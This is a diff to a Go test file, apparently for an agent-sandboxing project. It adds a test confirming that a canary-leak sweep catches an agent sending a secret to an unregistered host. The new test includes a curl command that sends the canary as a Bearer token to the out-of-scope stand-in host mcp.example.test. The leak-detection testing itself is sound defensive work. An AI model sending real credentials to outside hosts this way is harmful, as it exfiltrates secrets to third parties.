@@ -8,9 +8,13 @@ import (
 	"net/url"
 	"strings"
 	"testing"
+
+	"github.com/ethosagent/warden/test/harness"
+	"github.com/ethosagent/warden/test/harness/compose"
 )
 
-// TestCanaryNeedles proves the scanner finds the secret under every encoding
+// TestCanaryNeedles proves the scanner this package uses (canaryNeedles and
+// leaksIn over the compose package) finds the secret under every encoding
 // the leak hunt claims, at every base64 alignment, with and without padding.
 // "\xfb\xff?>>" forces '+' '/' (std) and '-' '_' (url) into the output.
 func TestCanaryNeedles(t *testing.T) {
@@ -55,5 +59,28 @@ func TestCanaryScannerSeesTheRecorder(t *testing.T) {
 	}
 	if hits := leaksIn(string(recordedRaw(t)), canaryNeedles(canary)); len(hits) == 0 {
 		t.Fatal("scanner found no canary in the recorder, which holds it by design")
+	}
+}
+
+// TestCanarySweepCoversUnregisteredHosts: the raw canary the agent sends to
+// mcp.example.test — a host OUTSIDE the secret's MatchHosts that this scenario
+// never registered a view for — must fail the harness canary sweep. The stack's
+// recorder sees every host the fake DNS serves, registered or not, so the sweep
+// reads its whole /_recorded view (harness.WholeRecorder); before that, a
+// worker bug that swapped the secret toward this host passed both sweeps clean.
+// The harness boots FIRST: its target Start resets the recorder, so the sweep's
+// view holds exactly this scenario's traffic.
+func TestCanarySweepCoversUnregisteredHosts(t *testing.T) {
+	h := harness.New(t, harness.WithTarget(compose.New()))
+	res := agentRun(t, svcAgent1, "curl", "-sS", "--max-time", "10",
+		"-H", "Authorization: Bearer "+canary, "-o", "/dev/null",
+		"https://mcp.example.test/")
+	if res.exit != 0 {
+		t.Fatalf("the canary request to mcp.example.test did not go through: exit %d: %s", res.exit, res.stderr)
+	}
+
+	leaks := strings.Join(h.CanaryLeaks(), "\n")
+	if !strings.Contains(leaks, "mcp.example.test") || !strings.Contains(leaks, "raw") {
+		t.Fatalf("the raw canary reached the out-of-scope, unregistered mcp.example.test and the sweep said:\n%s", leaks)
 	}
 }
